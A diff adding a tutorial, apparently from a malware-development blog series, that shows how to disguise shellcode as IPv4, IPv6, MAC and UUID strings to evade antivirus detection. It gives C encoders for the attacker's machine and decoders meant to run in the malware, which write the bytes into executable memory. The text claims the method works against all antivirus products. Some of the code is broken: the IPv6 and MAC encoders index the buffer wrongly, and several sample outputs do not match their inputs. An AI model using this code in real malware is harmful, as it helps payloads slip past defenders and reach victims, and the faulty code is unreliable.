@@ -1,0 +1,412 @@
+> Last time we saw Encryption. Today we are going to take a look at Obfuscation. Please feel free to contact me if you require any help, also please correct me if I made any mistakes. So get started and please try to write code on your own. 
+
+# Prerequisites 
+Trust me dude if you are here, you already know these topics. If not go learn them, they are bare minimum.
+1. Hexadecimal number system
+2. C Pointer 
+
+*Obfuscation* - To convert some imp data like shellcode to unidentifiable data or some other form of data that is recognizable but not traceable like ipv4, MAC etc.
+
+*De obfuscation* - Reverting the obfuscated string to normal form
+
+# vs Antivirus
+Does it work against AV ?? Against virustotal ??
+- **Yes**, it does *work against all AV's*
+- **No**, *not 100% on VT*.
+- **Reason** - we are using no other method to evade *AI based detection*
+![your internet sucks image not loaded](/images/PayloadObfuscation-3.png)
+It is generally hard to evade these 4, because -
+1. **DeepInstinct** – AI-based, detects threats _before_ execution. Trained on lots of malware patterns.
+2. **Google (Cloud Security)** – Uses static + dynamic + ML analysis.
+3. **Ikarus** – Austrian AV, aggressive on low-level binary analysis.
+4. **SecureAge APEX** – Uses _whitelisting + cryptographic fingerprinting_. Suspects _anything_ unknown.
+
+# Obfuscation and DE obfuscation
+To prevent our shellcode to be detected by AV we need to obfuscate it (in attacker machine) and then De obfuscate it (in victim), so it can be used. There is no key in obfuscation unlike encryption.
+
+We will follow this flow to obfuscate the shellcode -
+1. **Padding** - adding `0x90` (*no operation*) to fill out the remaining bytes to make an **4 byte IP**.
+```c
+\x23\x43\x54 => "23.43.54.???" (ip address is 4 bytes)
+\x23\x43\x54 + \x90 => "23.43.54.90" [+] done
+```
+1. **Converting** - converting shellcode (*Hex*) to IPv4 (*Decimal*) or IPv6 (*Hex*).
+2. **Storing** - storing it in an variable and printing it
+
+Now to de obfuscate the IP, Mac etc we will follow -
+1. **Loading** - placing the output of the above program in our code
+```c
+char IPs[4][16] = {
+        "144.144.128.144",
+        "144.112.144.144",
+        "144.96.144.144",
+        "153.144.144.144"
+    };
+```
+2. **Reverting** - revert the IP to the shellcode using memory or you can also use variables
+3. **Storing** - printing the output
+## IPv4
+From the below image you can see what we are trying to achieve
+![your internet sucks image not loaded](/images/PayloadObfuscation-1.png)
+	1. Following code converts *shellcode to IP address*. And this program should be keep on attackers machine.
+	2. Follow the code and ask chatGPT if you don't understand anything. I have used comments to make it easy.
+```c
+#include <stdio.h>
+#include <string.h>
+
+typedef unsigned char* uchar_ptr; // Using it coz it looks cool
+typedef unsigned char bytes;
+
+void processing(uchar_ptr pOutput, int size){
+    int newSize = size / 4;
+    char ipStrings[newSize][16]; // 16 coz ip address has 15 char + null byte
+    for(int i=0; i < newSize; i++){
+
+        snprintf(ipStrings[i],sizeof(ipStrings[i]),"%d.%d.%d.%d",pOutput[i*4], pOutput[i*4+1], pOutput[i*4+2], pOutput[i*4+3]);    // mapping the shellcode into the variable
+    }
+
+    printf("char IPs[%d][16] = {\n",newSize);
+    for(int i = 0; i < newSize; i++){
+        printf("\t\"%s\"", ipStrings[i]);
+        if (i != newSize - 1)
+            printf(",\n");  // comma for all except last element
+        else
+            printf("\n");
+    }
+    printf("};");
+}
+
+void padding(unsigned char* pShellcode, int size, unsigned char* pOutput){
+    int toAdd = 4 - (size % 4); // checking how much padding is req
+    for (int i=0; i < toAdd;i++){
+        pOutput[size+i] = 0x90;
+    }
+    processing(pOutput, size + toAdd);  
+}
+
+int main(){
+    bytes shellcode[] = {0x90,0x90,0x80,0x90,0x90,0x70,0x90,0x90,0x90,0x60,0x90,0x90,0x99};
+    unsigned int size = sizeof(shellcode);
+    bytes output[size + 3]; // keeping space for the extra padding
+    memcpy(output, shellcode, size); // copying the data over, now we have 3 bytes of extra storage
+    uchar_ptr pShellcode = shellcode;
+    uchar_ptr pOutput = output;
+    if (size == 0){
+        return 1;
+    }  
+    if(size % 4 != 0){
+        padding(pShellcode, size, pOutput);
+    }
+    else{
+        processing(pShellcode, size); // don't need any padding
+    }
+}
+```
+2. This should be implemented in the malware itself.
+```c
+#include <stdio.h>
+#include <windows.h>
+
+int main(){
+    char IPs[4][16] = {     // output of the obfuscation
+        "144.144.128.144",
+        "144.112.144.144",
+        "144.96.144.144",
+        "153.144.144.144"
+    };
+    int rows = sizeof(IPs) / sizeof(IPs[0]);
+    void *shellcode = VirtualAlloc(0, rows * 4, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // allocate mem to store shellcode
+    unsigned char* p = (unsigned char*)shellcode;
+    for (int i=0; i < rows; i++){
+        int a,b,c,d;
+        sscanf(IPs[i], "%d.%d.%d.%d", &a, &b, &c, &d); // Extracting shellcode from the IP addr
+        *p++ = (unsigned char)a;
+        *p++ = (unsigned char)b;
+        *p++ = (unsigned char)c;
+        *p++ = (unsigned char)d;
+    }
+
+    printf("Shellcode bytes:\n");      // printing the IP
+    for (int i = 0; i < 16; i++) {
+        printf("\\x%02X", ((unsigned char*)shellcode)[i]);
+    }
+    printf("\n");
+    return 0;
+}
+```
+
+## IPv6
+If you don't know we have *ran out of IPv4 long ago* and we will have to use IPv6 in the future, so practice it.
+1. obfuscating IP
+```c
+#include <stdio.h>
+#include <string.h>
+  
+typedef unsigned char* uchar_ptr;
+typedef unsigned char bytes;
+  
+void processing(uchar_ptr pOutput, int size){
+    int newSize = size / 16;
+    char ipStrings[newSize][40]; // we are considering hex + : + null character = 40
+    for(int i=0; i < newSize; i++){
+        snprintf(ipStrings[i],sizeof(ipStrings[i]),"%02X%02X:%02X%02X:%02X%02X:%02X%02X:%02X%02X:%02X%02X:%02X%02X:%02X%02X",pOutput[i*4], pOutput[i*4+1], pOutput[i*4+2], pOutput[i*4+3], pOutput[i*4+4], pOutput[i*4+5], pOutput[i*4+6], pOutput[i*4+7], pOutput[i*4+8], pOutput[i*4+9], pOutput[i*4+10], pOutput[i*4+11], pOutput[i*4+12], pOutput[i*4+13], pOutput[i*4+14], pOutput[i*4+15]);    // Ipv6 is of 16 bytes total, has 8 octates and each octate has 2 bytes
+    }
+
+    printf("char IPs[%d][40] = {\n",newSize);
+    for(int i = 0; i < newSize; i++){
+        printf("\t\"%s\"", ipStrings[i]);
+        if (i != newSize - 1)
+            printf(",\n");  
+        else
+            printf("\n");
+    }
+    printf("};");
+}
+
+void padding(unsigned char* pShellcode, int size, unsigned char* pOutput){
+    int toAdd = 16 - (size % 16); 
+    for (int i=0; i < toAdd;i++){
+        pOutput[size+i] = 0x90;
+    }
+    processing(pOutput, size + toAdd);  
+}
+
+int main(){
+    bytes shellcode[] = {0xfe, 0x4d, 0x5a, 0xff, 0xee, 0xab ,0x90,0x90,0x90,0x60,0x90,0x90,0x99,0x90,0x60,0x90,0x90,0x99,0x90,0x60,0x90,0x90,0x99};
+    unsigned int size = sizeof(shellcode);
+    bytes output[size + 15];
+    memcpy(output, shellcode, size);
+    uchar_ptr pShellcode = shellcode;
+    uchar_ptr pOutput = output;
+    if (size == 0){
+        return 1;
+    }  
+    if(size % 16 != 0){
+        padding(pShellcode, size, pOutput);
+    }
+    else{
+        processing(pShellcode, size);
+    }
+}
+```
+2. Now, the way `sscanf` works is
+```cpp
+%02X,%02X => this won't work
+%4X => have to use compelsory this 
+```
+3. so we have to take 2 bytes together and then separate it afterwards with *bit operation*, like following
+```c
+FOR example a = 1011 0001 1101 0101
+a >> 8 & 0xFF; => 0000 0000 1011 0001 => Bitwise AND op with 0xFF (0000 0000 1111 1111) => 1011 0001 } 1st byte 
+a & 0xFF); => 1101 0101 } 2nd byte
+```
+
+```c
+#include <stdio.h>
+#include <windows.h>
+
+int main(){
+    char IPs[2][40] = {
+        "FE4D:5AFF:EEAB:9090:9060:9090:9990:6090",
+        "EEAB:9090:9060:9090:9990:6090:9099:9060"
+};
+    int rows = sizeof(IPs) / sizeof(IPs[0]);
+    void *shellcode = VirtualAlloc(0, rows * 16, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memset(shellcode, 0, rows * 16);
+    unsigned char* temp = (unsigned char*)shellcode;
+    for (int i=0; i < rows; i++){
+        unsigned short segment[8];
+        sscanf(IPs[i], "%4X:%4X:%4X:%4X:%4X:%4X:%4X:%4X", &segment[0], &segment[1], &segment[2], &segment[3], &segment[4], &segment[5], &segment[6], &segment[7]);
+
+        for (int j=0; j < 8; j++){
+            *temp++ = (unsigned char)(segment[j] >> 8) & 0xFF;
+            *temp++ = (unsigned char)(segment[j] & 0xFF);
+        }
+    }
+    printf("Shellcode bytes:\n");
+    for (int i = 0; i < rows * 16; i++) {
+        printf("\\x%02X", ((unsigned char*)shellcode)[i]);
+    }
+    printf("\n");
+    return 0;
+}
+```
+
+## MAC
+I would like you to try MAC obfuscation and de obfuscation on your own as it's the easiest method of all.
+1. Obfuscation
+```c
+#include <stdio.h>
+#include <string.h>
+
+typedef unsigned char* uchar_ptr;
+typedef unsigned char bytes;
+
+void processing(uchar_ptr pOutput, int size){
+    int newSize = size / 6;
+    char macStrings[newSize][18];
+    for(int i=0; i < newSize; i++){
+        snprintf(macStrings[i],sizeof(macStrings[i]),"%02X:%02X:%02X:%02X:%02X:%02X",pOutput[i*4], pOutput[i*4+1], pOutput[i*4+2], pOutput[i*4+3],pOutput[i*4+4],pOutput[i*4+5]);      
+
+    }
+    printf("char MAC[%d][18] = {\n",newSize);
+    for(int i = 0; i < newSize; i++){
+        printf("\t\"%s\"", macStrings[i]);
+        if (i != newSize - 1)
+            printf(",\n");  
+        else
+            printf("\n");
+    }
+    printf("};");
+}
+
+void padding(unsigned char* pShellcode, int size, unsigned char* pOutput){
+    int toAdd = 6 - (size % 6); 
+    for (int i=0; i < toAdd;i++){
+        pOutput[size+i] = 0x90;
+    }
+    processing(pOutput, size + toAdd);  
+}
+
+int main(){
+    bytes shellcode[] = {0xAE,0xFF,0x80,0x90,0xEE,0x70,0xAB,0x9A,0x90,0x60,0x90,0x90,0x99};
+    unsigned int size = sizeof(shellcode);
+    bytes output[size + 5];
+    memcpy(output, shellcode, size);
+    uchar_ptr pShellcode = shellcode;
+    uchar_ptr pOutput = output;
+    
+    if (size == 0){
+        return 1;
+    }  
+    if(size % 6 != 0){
+        padding(pShellcode, size, pOutput);
+    }
+    else{
+        processing(pShellcode, size);
+    }
+}
+```
+2. De obfuscation
+```c
+#include <stdio.h>
+#include <windows.h>
+  
+int main(){
+    char MAC[3][18] = {
+        "AE:FF:80:90:EE:70",
+        "EE:70:AB:9A:90:60",
+        "90:60:90:90:99:90"
+};
+    int rows = sizeof(MAC) / sizeof(MAC[0]);
+    void *shellcode = VirtualAlloc(0, rows * 6, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memset(shellcode, 0, rows * 6);
+    unsigned char* p = (unsigned char*)shellcode;
+    for (int i=0; i < rows; i++){
+        unsigned short s[6];
+        sscanf(MAC[i], "%02X:%02X:%02X:%02X:%02X:%02X", &s[0], &s[1], &s[2], &s[3], &s[4], &s[5]);
+        for (int j=0; j < 6; j++){
+            *p++ = (unsigned char)s[j];    
+        }
+    }
+    printf("Shellcode bytes:\n");
+    for (int i = 0; i < rows * 6; i++) {
+        printf("\\x%02X", ((unsigned char*)shellcode)[i]);
+    }
+    printf("\n");
+    return 0;
+}
+```
+
+## UUID
+Now UUID requires a bit of tweaks
+- UUID is of *16 bytes*
+- It needs `VERSION` and `VARIANT` to be an legit UUID
+- So we will hardcode some of the part of UUID.
+- In the below image *4* = Version, *a* = Variant
+![your internet sucks image not loaded](/images/PayloadObfuscation-2.png)
+1. We will hardcode `41d4-a716` in the `snprintf` function like given below
+`"%02X%02X%02X%02X-%02X%02X-41d4-a716-%02X%02X%02X%02X%02X%02X"`
+2. so this will make the total bytes of the UUID `12`, so make changes accordingly
+```c
+#include <stdio.h>
+#include <string.h>
+
+typedef unsigned char* uchar_ptr;
+typedef unsigned char bytes;
+  
+void processing(uchar_ptr pOutput, int size){
+    int newSize = size / 12;                   
+    char uuidStrings[newSize][37];
+    for(int i=0; i < newSize; i++){
+        snprintf(uuidStrings[i],sizeof(uuidStrings[i]),"%02X%02X%02X%02X-%02X%02X-41d4-a716-%02X%02X%02X%02X%02X%02X",pOutput[i*12], pOutput[i*12+1], pOutput[i*12+2], pOutput[i*12+3], pOutput[i*12+4], pOutput[i*12+5], pOutput[i*12+6], pOutput[i*12+7], pOutput[i*12+8], pOutput[i*12+9], pOutput[i*12+10], pOutput[i*12+11]);      
+    }
+    printf("char UUID[%d][37] = {\n",newSize);
+    for(int i = 0; i < newSize; i++){
+        printf("\t\"%s\"", uuidStrings[i]);
+        if (i != newSize - 1)
+            printf(",\n");  
+        else
+            printf("\n");
+    }
+    printf("};");
+}
+
+void padding(unsigned char* pShellcode, int size, unsigned char* pOutput){
+    int toAdd = 12 - (size % 12);   // checking req padding after removing hardcoded part
+    for (int i=0; i < toAdd;i++){
+        pOutput[size+i] = 0x90;
+    }
+    processing(pOutput, size + toAdd);  
+}
+
+int main(){
+    bytes shellcode[] = {0xfe, 0x4d, 0x5a, 0xff, 0xee, 0xab ,0x90,0xFF,0xEE,0xDD,0xCC,0xBB,0xAA,};
+    unsigned int size = sizeof(shellcode);
+    bytes output[size + 11];
+    memcpy(output, shellcode, size);
+    uchar_ptr pShellcode = shellcode;
+    uchar_ptr pOutput = output;
+    
+    if (size == 0){
+        return 1;
+    }  
+    if(size % 12 != 0){
+        padding(pShellcode, size, pOutput);
+    }
+    else{
+        processing(pShellcode, size);
+    }
+}
+```
+3. Now de obfuscating it
+```c
+#include <stdio.h>
+#include <windows.h>
+
+int main(){
+    char UUID[2][37] = {
+        "FE4D5AFF-EEAB-41d4-a716-90FFEEDDCCBB",
+        "AA909090-9090-41d4-a716-909090909090"
+};
+
+    int rows = sizeof(UUID) / sizeof(UUID[0]);
+    void *shellcode = VirtualAlloc(0, rows * 12, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    unsigned char* p = (unsigned char*)shellcode;
+    for (int i=0; i < rows; i++){
+        unsigned short segment[12];
+        sscanf(UUID[i], "%02X%02X%02X%02X-%02X%02X-41d4-a716-%02X%02X%02X%02X%02X%02X", &segment[0], &segment[1], &segment[2], &segment[3], &segment[4], &segment[5], &segment[6], &segment[7], &segment[8], &segment[9], &segment[10], &segment[11]);
+        for (int j=0; j < 12; j++){
+            *p++ = (unsigned char)segment[j];
+        }
+    }
+    printf("Shellcode bytes:\n");
+    for (int i = 0; i < rows * 12; i++) {
+        printf("\\x%02X", ((unsigned char*)shellcode)[i]);
+    }
+    printf("\n");
+    return 0;
+}
+```
+
+Ya Ya I know you are tired, that all for today. And soon we are going to start Payload Execution, DLL etc etc. So stay tuned.
